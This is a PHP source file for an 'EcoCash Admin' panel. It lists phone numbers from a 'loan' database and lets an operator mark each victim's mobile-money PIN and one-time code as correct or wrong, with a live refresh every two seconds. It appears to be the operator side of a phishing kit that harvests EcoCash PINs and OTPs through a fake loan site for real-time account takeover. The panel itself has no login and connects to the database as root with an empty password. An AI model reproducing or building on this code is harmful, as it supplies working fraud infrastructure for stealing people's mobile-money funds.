<?php
session_start();

// ========== DATABASE CONFIGURATION ==========
$dbHost = 'localhost';
$dbName = 'loan';
$dbUser = 'root';
$dbPass = '';
// ============================================

try {
    $pdo = new PDO("mysql:host=$dbHost;dbname=$dbName;charset=utf8", $dbUser, $dbPass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}

// Handle AJAX requests for updating status
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
    
    header('Content-Type: application/json');
    
    $phone = $_POST['phone'] ?? '';
    $type = $_POST['type'] ?? '';   // 'pin' or 'otp'
    $action = $_POST['action'] ?? ''; // 'correct' (set to 1) or 'wrong' (set to 0)
    
    if (empty($phone) || !in_array($type, ['pin', 'otp']) || !in_array($action, ['correct', 'wrong'])) {
        echo json_encode(['success' => false, 'error' => 'Invalid request']);
        exit;
    }
    
    $column = ($type === 'pin') ? 'status' : 'otp_status';
    $newValue = ($action === 'correct') ? 1 : 0;
    
    $stmt = $pdo->prepare("UPDATE ecocash_auth SET $column = :value WHERE phone = :phone");
    $success = $stmt->execute([':value' => $newValue, ':phone' => $phone]);
    
    if ($success) {
        echo json_encode(['success' => true, 'newValue' => $newValue]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Database update failed']);
    }
    exit;
}

// AJAX endpoint to fetch fresh grouped data (used by polling)
if (isset($_GET['fetch_data']) && $_GET['fetch_data'] == 1) {
    header('Content-Type: application/json');
    $stmt = $pdo->query("
        SELECT 
            phone, 
            MAX(status) AS pin_status, 
            MAX(otp_status) AS otp_status 
        FROM ecocash_auth 
        GROUP BY phone 
        ORDER BY phone ASC
    ");
    $records = $stmt->fetchAll(PDO::FETCH_ASSOC);
    echo json_encode($records);
    exit;
}

// Initial page load: fetch grouped records for rendering
$stmt = $pdo->query("
    SELECT 
        phone, 
        MAX(status) AS pin_status, 
        MAX(otp_status) AS otp_status 
    FROM ecocash_auth 
    GROUP BY phone 
    ORDER BY phone ASC
");
$records = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>EcoCash Admin | Verify PIN & OTP</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        h1 {
            background: #0a5fa7;
            color: white;
            margin: 0;
            padding: 20px 24px;
            font-size: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .refresh-indicator {
            font-size: 12px;
            background: rgba(255,255,255,0.2);
            padding: 4px 10px;
            border-radius: 20px;
        }
        .table-wrapper {
            overflow-x: auto;
            padding: 20px 24px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 15px;
        }
        th, td {
            padding: 12px 16px;
            text-align: left;
            border-bottom: 1px solid #e0e0e0;
        }
        th {
            background-color: #f8f9fa;
            font-weight: 600;
            color: #1f2d3d;
        }
        tr:hover {
            background-color: #f5f7fa;
        }
        .badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }
        .badge-success {
            background-color: #d4edda;
            color: #155724;
        }
        .badge-warning {
            background-color: #fff3cd;
            color: #856404;
        }
        .btn {
            border: none;
            padding: 6px 14px;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            margin-right: 8px;
        }
        .btn-pin {
            background-color: #1d4ed8;
            color: white;
        }
        .btn-pin:hover {
            background-color: #1e40af;
        }
        .btn-otp {
            background-color: #10b981;
            color: white;
        }
        .btn-otp:hover {
            background-color: #059669;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal-content {
            background: white;
            border-radius: 12px;
            width: 300px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }
        .modal-content p {
            margin: 0 0 20px 0;
            font-size: 18px;
            font-weight: 500;
        }
        .modal-buttons {
            display: flex;
            gap: 12px;
            justify-content: center;
        }
        .modal-buttons button {
            padding: 8px 20px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            font-weight: 500;
        }
        .btn-correct {
            background-color: #10b981;
            color: white;
        }
        .btn-wrong {
            background-color: #ef4444;
            color: white;
        }
        .status-updated {
            animation: highlight 0.5s ease;
        }
        @keyframes highlight {
            0% { background-color: #c6f7d0; }
            100% { background-color: transparent; }
        }
        footer {
            padding: 16px 24px;
            background: #f8f9fa;
            font-size: 12px;
            color: #6c757d;
            text-align: center;
            border-top: 1px solid #e0e0e0;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>
        🔐 EcoCash Admin Panel – Verify PIN & OTP
        <span class="refresh-indicator" id="refreshStatus">Auto-refresh every 2s</span>
    </h1>
    <div class="table-wrapper">
        <table id="dataTable">
            <thead>
                <tr>
                    <th>Phone Number</th>
                    <th>PIN Status</th>
                    <th>OTP Status</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="tableBody">
                <!-- Dynamic content loaded via JS -->
            </tbody>
        </table>
    </div>
    <footer>
        ⚡ Click "Verify PIN" or "Verify OTP" → choose "Correct" (✔) or "Wrong" (✘).<br>
        ✅ Each phone appears once. Status is updated immediately for all rows of that phone.
    </footer>
</div>

<!-- Modal Overlay -->
<div id="verifyModal" class="modal">
    <div class="modal-content">
        <p id="modalMessage">Mark this as correct or wrong?</p>
        <div class="modal-buttons">
            <button id="modalCorrect" class="btn-correct">✔ Correct (set to 1)</button>
            <button id="modalWrong" class="btn-wrong">✘ Wrong (set to 0)</button>
        </div>
    </div>
</div>

<script>
    let pendingPhone = null;
    let pendingType = null;
    const modal = document.getElementById('verifyModal');
    const modalMessage = document.getElementById('modalMessage');
    const tableBody = document.getElementById('tableBody');

    function renderTable(records) {
        if (!records || records.length === 0) {
            tableBody.innerHTML = '<tr><td colspan="4" style="text-align: center;">No records found in database.</td></tr>';
            return;
        }
        let html = '';
        records.forEach(record => {
            const phone = escapeHtml(record.phone);
            const pinStatus = parseInt(record.pin_status);
            const otpStatus = parseInt(record.otp_status);
            
            html += `<tr data-phone="${phone}">`;
            html += `<td>+263 ${phone}</td>`;
            html += `<td class="pin-status-cell">
                        <span class="badge ${pinStatus ? 'badge-success' : 'badge-warning'}">
                            ${pinStatus ? 'Verified (1)' : 'Pending (0)'}
                        </span>
                     </td>`;
            html += `<td class="otp-status-cell">
                        <span class="badge ${otpStatus ? 'badge-success' : 'badge-warning'}">
                            ${otpStatus ? 'Verified (1)' : 'Pending (0)'}
                        </span>
                     </td>`;
            html += `<td>
                        <button class="btn btn-pin verify-pin" data-phone="${phone}">✔ Verify PIN</button>
                        <button class="btn btn-otp verify-otp" data-phone="${phone}">✔ Verify OTP</button>
                      </td>`;
            html += `</tr>`;
        });
        tableBody.innerHTML = html;
        attachButtonEvents();
    }
    
    function escapeHtml(str) {
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    function attachButtonEvents() {
        document.querySelectorAll('.verify-pin').forEach(btn => {
            btn.removeEventListener('click', pinClickHandler);
            btn.addEventListener('click', pinClickHandler);
        });
        document.querySelectorAll('.verify-otp').forEach(btn => {
            btn.removeEventListener('click', otpClickHandler);
            btn.addEventListener('click', otpClickHandler);
        });
    }
    
    function pinClickHandler(e) {
        const phone = e.currentTarget.getAttribute('data-phone');
        showModal(phone, 'pin');
    }
    
    function otpClickHandler(e) {
        const phone = e.currentTarget.getAttribute('data-phone');
        showModal(phone, 'otp');
    }
    
    function showModal(phone, type) {
        pendingPhone = phone;
        pendingType = type;
        const typeLabel = type === 'pin' ? 'PIN' : 'OTP';
        modalMessage.innerText = `Set ${typeLabel} for ${phone} as:`;
        modal.style.display = 'flex';
    }
    
    function closeModal() {
        modal.style.display = 'none';
        pendingPhone = null;
        pendingType = null;
    }
    
    async function updateStatus(phone, type, action) {
        const formData = new FormData();
        formData.append('phone', phone);
        formData.append('type', type);
        formData.append('action', action);  // 'correct' or 'wrong'
        
        try {
            const response = await fetch(window.location.href, {
                method: 'POST',
                headers: { 'X-Requested-With': 'XMLHttpRequest' },
                body: formData
            });
            const result = await response.json();
            if (result.success) {
                // Immediately refresh the table to show updated status
                await fetchAndRefresh();
                closeModal();
            } else {
                alert('Error: ' + (result.error || 'Could not update status.'));
                closeModal();
            }
        } catch (err) {
            alert('Network error: ' + err.message);
            closeModal();
        }
    }
    
    async function fetchAndRefresh() {
        try {
            const response = await fetch(window.location.href + '?fetch_data=1');
            const records = await response.json();
            renderTable(records);
        } catch (err) {
            console.error('Failed to fetch data:', err);
        }
    }
    
    // Modal button handlers
    document.getElementById('modalCorrect').addEventListener('click', () => {
        if (pendingPhone && pendingType) {
            updateStatus(pendingPhone, pendingType, 'correct');
        } else {
            closeModal();
        }
    });
    
    document.getElementById('modalWrong').addEventListener('click', () => {
        if (pendingPhone && pendingType) {
            updateStatus(pendingPhone, pendingType, 'wrong');
        } else {
            closeModal();
        }
    });
    
    // Close modal when clicking outside content
    window.addEventListener('click', (e) => {
        if (e.target === modal) {
            closeModal();
        }
    });
    
    // Auto-refresh every 2 seconds
    fetchAndRefresh();
    setInterval(fetchAndRefresh, 2000);
</script>
</body>
</html>